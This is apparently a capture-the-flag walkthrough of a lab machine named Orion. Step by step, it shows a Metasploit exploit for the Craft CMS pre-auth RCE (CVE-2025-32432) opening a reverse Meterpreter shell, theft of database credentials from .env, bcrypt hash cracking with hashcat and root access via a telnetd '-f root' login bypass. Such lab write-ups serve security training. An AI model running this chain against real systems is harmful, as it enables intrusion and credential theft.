
<img width="1599" height="371" alt="image" src="https://github.com/user-attachments/assets/e5ca1c00-f6cb-4b69-89b4-043624441d7f" />



```
nano /etc/hosts 
```

```
nmap orion.htb                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 13:42 -0400
Nmap scan report for orion.htb (10.129.59.24)
Host is up (0.29s latency).
Not shown: 961 closed tcp ports (reset), 37 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 255.37 seconds

```



<img width="1900" height="694" alt="image" src="https://github.com/user-attachments/assets/5b923a58-b907-44d3-aad7-18f034686b0a" />


<img width="1400" height="741" alt="image" src="https://github.com/user-attachments/assets/e27eeed7-0111-4770-98d4-7dcde268f173" />


<img width="1351" height="822" alt="image" src="https://github.com/user-attachments/assets/b65e7373-c62a-4fc4-8230-42da618cd643" />


```
msfconsole 

search cve_2025_32432

use 0
set rhost orion.htb
set  lhost tun0
exploit

```




```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb
rhosts => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rport 80
rport => 80
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost 10.10.14.60
lhost => 10.10.14.60
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[-] Msf::OptionValidateError The following options failed to validate:
[-] Invalid option RHOSTS: Host resolution failed: orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS 10.129.244.146
RHOSTS => 10.129.244.146
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[*] Started reverse TCP handler on 10.10.14.60:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Could not retrieve session & CSRF "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > show options

Module options (exploit/linux/http/craftcms_preauth_rce_cve_2025_32432):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ASSET_ID  42               yes       Existing asset ID
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, http, socks5h, sapni, sock
                                        s4
   RHOSTS    10.129.244.146   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.60      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
[*] Started reverse TCP handler on 10.10.14.60:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Could not retrieve session & CSRF "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set VHOST orion.htb
VHOST => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set ForceExploit true
ForceExploit => true
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
[*] Started reverse TCP handler on 10.10.14.60:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.244.146
[*] Meterpreter session 1 opened (10.10.14.60:4444 -> 10.129.244.146:56824) at 2026-07-29 08:19:00 -0400

meterpreter > shell
Process 1404 created.
Channel 0 created.
ls
assets
cpresources
index.html
index.php
script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@orion:~/html/craft/web$ ls -la
ls -la
total 36
drwxrwxr-x  4 www-data www-data 4096 Mar  7 15:31 .
drwxrwxr-x  7 www-data www-data 4096 Mar  6 11:22 ..
-rw-rw-r--  1 www-data www-data  283 Nov 18  2025 .htaccess
drwxr-xr-x  5 www-data www-data 4096 Mar  6 12:12 assets
drwxrwxr-x 19 www-data www-data 4096 Jul 29 12:25 cpresources
-rw-r--r--  1 www-data www-data 9689 Mar  6 12:12 index.html
-rw-rw-r--  1 www-data www-data  258 Nov 18  2025 index.php
www-data@orion:~/html/craft/web$ cd ..
cd ..
www-data@orion:~/html/craft$ ls -la
ls -la
total 364
drwxrwxr-x  7 www-data www-data   4096 Mar  6 11:22 .
drwxr-xr-x  3 root     root       4096 Mar  6 11:19 ..
-rw-rw-r--  1 www-data www-data    718 Mar  6 11:24 .env
-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
-rw-rw-r--  1 www-data www-data    611 Mar  6 11:20 composer.json
-rw-rw-r--  1 www-data www-data 310507 Mar  6 11:20 composer.lock
drwxrwxr-x  4 www-data www-data   4096 Mar  6 11:26 config
-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
drwxrwxr-x  5 www-data www-data   4096 Mar  6 11:24 storage
drwxrwxr-x  2 www-data www-data   4096 Mar 10 10:46 templates
drwxrwxr-x 49 www-data www-data   4096 Mar  6 11:20 vendor
drwxrwxr-x  4 www-data www-data   4096 Mar  7 15:31 web
www-data@orion:~/html/craft$ cat .env
cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
www-data@orion:~/html/craft$ mysql -u root -p orion
mysql -u root -p orion
Enter password: SuperSecureCraft123Pass!

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [orion]> select * from users;
select * from users;
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | affiliatedSiteId | active | pending | locked | suspended | admin | username | fullName | firstName | lastName | email          | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |             NULL |      1 |       0 |      0 |         0 |     1 | admin    | NULL     | NULL      | NULL     | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04 | NULL               | NULL                    |              NULL | NULL                 | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2026-03-12 11:24:51    | 2026-03-06 11:24:45 | 2026-03-12 11:25:04 |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.000 sec)

MariaDB [orion]> 

```

```
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

```

<img width="1437" height="493" alt="image" src="https://github.com/user-attachments/assets/9ba168c5-71e8-4521-bf3c-f751c7cc4edb" />

pass: darkangel


```
ssh adam@orion.htb                                                                       
The authenticity of host 'orion.htb (10.129.244.146)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'orion.htb' (ED25519) to the list of known hosts.
adam@orion.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 12:38:17 PM UTC 2026

  System load:  0.0               Processes:             227
  Usage of /:   77.4% of 5.81GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.244.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

adam@orion:~$ ls
user.txt
adam@orion:~$ cat user.txt
e3e9c52471454f72659d684ef124075a
adam@orion:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/2)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 12:42:25 PM UTC 2026

  System load:  0.0               Processes:             233
  Usage of /:   77.4% of 5.81GB   Users logged in:       1
  Memory usage: 10%               IPv4 address for eth0: 10.129.244.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@orion:~# ls
root.txt  snap
root@orion:~# cat root.txt
428c511f1524bf2e2176ad357b570d85
root@orion:~# 

```


<img width="1211" height="690" alt="image" src="https://github.com/user-attachments/assets/54498ad3-7759-40f6-91d8-0561870cf536" />

